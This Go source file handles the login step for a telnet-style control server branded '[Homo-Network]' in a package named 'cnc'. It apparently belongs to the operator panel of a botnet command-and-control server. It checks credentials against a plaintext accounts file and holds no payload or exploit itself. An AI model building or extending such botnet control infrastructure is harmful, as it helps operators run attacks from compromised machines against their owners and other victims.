package cnc

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"net/textproto"
	"os"
	"strings"

	"github.com/fatih/color"
	"github.com/iskaa02/qalam/gradient"
)

type Session struct {
	Ip       string
	Login    string
	Password string
	Conn     net.Conn
	Allcount int
}

func NewSession(Login, Password string, Ip string, Conn net.Conn, Allcount int) *Session {

	return &Session{
		Ip:       Ip,
		Login:    Login,
		Password: Password,
		Conn:     Conn,
		Allcount: Allcount,
	}

}

var Live bool
var SessionList = make(map[net.Conn]*Session)
var Tempcount int

func LoginPage(conn net.Conn) {

	conn.Write([]byte(gradient.Rainbow().Apply("[Homo-Network]") + color.HiWhiteString(" Enter login: ")))

	reader := bufio.NewReader(conn)
	tp := textproto.NewReader(reader)
	_login, err := tp.ReadLine()

	login := bytes.TrimPrefix([]byte(_login), []byte{255, 251, 31, 255, 251, 32, 255, 251, 24, 255, 251, 39, 255, 253, 1, 255, 251, 3, 255, 253, 3})

	if err != nil {
		fmt.Println(err)
	}

	conn.Write([]byte((gradient.Rainbow().Apply("[Homo-Network]") + color.HiWhiteString(" Enter password: "))))

	password := make([]byte, 1024)

	_, err = conn.Read(password)

	password = bytes.ReplaceAll(password, []byte{0}, []byte{})
	password = bytes.ReplaceAll(password, []byte{13}, []byte{})
	password = bytes.ReplaceAll(password, []byte{10}, []byte{})

	if err != nil {
		fmt.Println(err)
	}

	accs, _ := os.ReadFile("./data/accounts.txt")

	vv := []byte(string(login) + ":" + string(password))

	for _, acc := range strings.Split(string(accs), "\n") {

		if bytes.EqualFold(vv, bytes.ReplaceAll([]byte(acc), []byte{13}, []byte{})) {

			if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
				Tempcount++
				sess := NewSession(string(login), string(password), addr.IP.String(), conn, Tempcount)
				SessionList[conn] = sess
				Live = true

				return
			}
		}
	}
	if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
		sess := NewSession(string(login), string(password), addr.IP.String(), conn, Tempcount)
		SessionList[conn] = sess
	}
	Print(color.HiRedString("Access denied\n"), conn)
	DeadSession(conn)
	conn.Close()

}

func DeadSession(conn net.Conn) {
	delete(SessionList, conn)
}
